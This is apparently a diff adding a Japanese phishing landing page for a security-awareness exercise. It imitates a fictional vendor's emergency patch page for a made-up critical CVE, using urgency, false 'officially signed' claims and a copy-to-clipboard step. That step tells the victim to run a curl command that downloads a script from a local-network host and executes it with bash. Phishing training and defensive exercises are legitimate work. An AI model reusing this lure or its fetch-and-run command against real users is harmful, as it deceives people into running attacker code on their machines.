@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>緊急セキュリティパッチ | GO DX セキュリティ対応センター</title>
+<!-- ============================================================
+     教育・防御演習専用のフィッシング「着地ページ」/ Phishing landing
+     page for education & defensive training ONLY.  GO DX / 楽々データ共有 /
+     CVE-2026-8847 は架空。実在のサイト・脆弱性・企業ではありません。
+     演習ファシリテーター向け: メール(gmail_inbox_ja.html)のリンクから開かれます。
+     コマンド内のホストは演習環境に合わせて書き換えてください。
+     ============================================================ -->
+<style>
+  :root{--brand1:#00b8d4;--brand2:#0091ea;--brand3:#3949ab;--ink:#12203a;--muted:#5b6b86;--line:#e3e9f2}
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:'Segoe UI','Hiragino Kaku Gothic ProN','Yu Gothic',Meiryo,sans-serif;
+       background:#eef2f8;color:var(--ink);line-height:1.7;padding:24px}
+  .card{max-width:680px;margin:0 auto;background:#fff;border-radius:14px;overflow:hidden;
+        box-shadow:0 18px 50px rgba(18,32,58,.18)}
+  .top{background:linear-gradient(135deg,var(--brand2),var(--brand3));color:#fff;padding:26px 30px;
+       display:flex;align-items:center;gap:14px}
+  .badge{width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,.15);
+         display:flex;align-items:center;justify-content:center}
+  .top h1{font-size:20px;font-weight:800;letter-spacing:.5px}
+  .top small{display:block;font-size:11px;letter-spacing:2px;color:#c5cae9;font-weight:600}
+  .content{padding:30px}
+  .alert{background:#fdecea;border:2px solid #e74c3c;border-radius:8px;padding:16px 18px;margin-bottom:24px}
+  .alert h3{color:#c0392b;font-size:16px;margin-bottom:6px}
+  .alert p{color:#7b241c;font-size:14px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:26px}
+  .box{background:#f5f8fc;border-left:4px solid var(--brand2);border-radius:6px;padding:12px 14px}
+  .box label{display:block;font-size:11px;color:var(--muted);font-weight:700;letter-spacing:1px;margin-bottom:4px}
+  .box b{font-size:16px}
+  .dl{display:block;width:100%;text-align:center;text-decoration:none;
+      background:linear-gradient(135deg,var(--brand1),var(--brand3));color:#fff;font-weight:800;
+      font-size:17px;padding:16px;border-radius:9px;box-shadow:0 10px 24px rgba(41,73,171,.3);
+      transition:transform .15s,box-shadow .15s}
+  .dl:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(41,73,171,.4)}
+  .steps{background:#e8f4f8;border:1px solid #b8dae6;border-radius:8px;padding:18px 22px;margin-top:22px}
+  .steps h4{color:#0c5460;font-size:14px;margin-bottom:10px}
+  .steps ol{margin-left:18px;color:#0c5460;font-size:13px;line-height:1.9}
+  .cmd{background:#0f1830;color:#7ff0d8;font-family:'Consolas','Courier New',monospace;font-size:13px;
+       padding:14px 16px;border-radius:7px;margin-top:12px;word-break:break-all;cursor:pointer;position:relative}
+  .cmd:hover{outline:2px solid var(--brand1)}
+  .copied{display:none;margin-top:8px;background:#d4edda;border:1px solid #c3e6cb;color:#155724;
+          padding:8px 12px;border-radius:6px;font-size:13px}
+  .verified{display:flex;align-items:center;gap:8px;margin-top:20px;color:#2e7d32;font-size:13px;font-weight:600}
+  .foot{background:#f8f9fa;border-top:1px solid var(--line);padding:16px 30px;font-size:12px;color:var(--muted)}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <span class="badge">
+      <svg width="26" height="26" viewBox="0 0 60 60" fill="none" stroke="#18ffb0" stroke-width="7" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M14 14 L30 30 L14 46"/><path d="M30 14 L46 30 L30 46" opacity=".6"/>
+      </svg>
+    </span>
+    <div>
+      <h1>GO DX セキュリティ対応センター</h1>
+      <small>EMERGENCY SECURITY PATCH DISTRIBUTION</small>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="alert">
+      <h3>⚠️ 重大な脆弱性 CVE-2026-8847（CVSS 9.8 / CRITICAL）</h3>
+      <p>「楽々データ共有」v1.0〜v1.8.5 にリモートコード実行の脆弱性が確認されました。
+         本日中に修正パッチ v1.8.6 の適用が必要です。</p>
+    </div>
+
+    <div class="grid">
+      <div class="box"><label>製品 / PRODUCT</label><b>楽々データ共有</b></div>
+      <div class="box"><label>パッチ / PATCH</label><b>v1.8.6（最新）</b></div>
+      <div class="box"><label>深刻度 / SEVERITY</label><b style="color:#c0392b">CRITICAL</b></div>
+      <div class="box"><label>対応期限 / DUE</label><b>本日 24時間以内</b></div>
+    </div>
+
+    <!-- 演習: ダウンロードは演習用ペイロード配布に置き換える。ここではデモとしてコマンド表示に誘導 -->
+    <a class="dl" href="#install" onclick="reveal()">⬇️ 修正パッチ v1.8.6 をダウンロード</a>
+
+    <div class="steps" id="install">
+      <h4>📋 インストール手順</h4>
+      <ol>
+        <li>下のコマンドをクリックしてコピー</li>
+        <li>ターミナルを開く</li>
+        <li>コマンドを貼り付けて実行（Enter）</li>
+        <li>パッチが自動適用されます（再起動不要）</li>
+      </ol>
+      <div class="cmd" id="cmd" onclick="copyCmd()">curl -o /tmp/update.sh http://192.168.11.7:8888/fake_update.sh &amp;&amp; bash /tmp/update.sh</div>
+      <div class="copied" id="copied">✓ コマンドをコピーしました。ターミナルに貼り付けてください。</div>
+      <div class="verified">🔒 GO DX 公式署名済み ・ チェックサム検証済み ・ SSL 保護</div>
+    </div>
+  </div>
+
+  <div class="foot">
+    GO DX セキュリティ対応センター ・ security@godx.co.jp ・ 緊急ホットライン 0120-GODX-911<br>
+    © 2026 GO DX Corporation.（本ページは演習用の架空サイトです）
+  </div>
+</div>
+
+<script>
+  function reveal(){document.getElementById('install').scrollIntoView({behavior:'smooth'});}
+  function copyCmd(){
+    var t=document.getElementById('cmd').innerText;
+    var done=function(){document.getElementById('copied').style.display='block';};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done).catch(done);}
+    else{done();}
+  }
+</script>
+</body>
+</html>
